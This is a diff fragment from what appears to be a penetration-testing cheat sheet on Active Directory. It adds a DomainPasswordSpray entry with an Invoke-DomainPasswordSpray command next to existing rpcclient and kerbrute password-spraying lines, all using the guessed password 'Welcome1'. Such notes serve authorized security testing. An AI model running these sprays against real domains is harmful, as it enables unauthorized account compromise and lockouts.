@@ -1385,6 +1385,13 @@ $ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;
 $ kerbrute passwordspray -d <Domain Name> --dc <DC IP address> names.txt <password>
 ```
 
+- DomainPasswordSpray
+
+```
+https://github.com/dafthack/domainpasswordspray
+PS C:\> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
 - Netexec
 
 ```
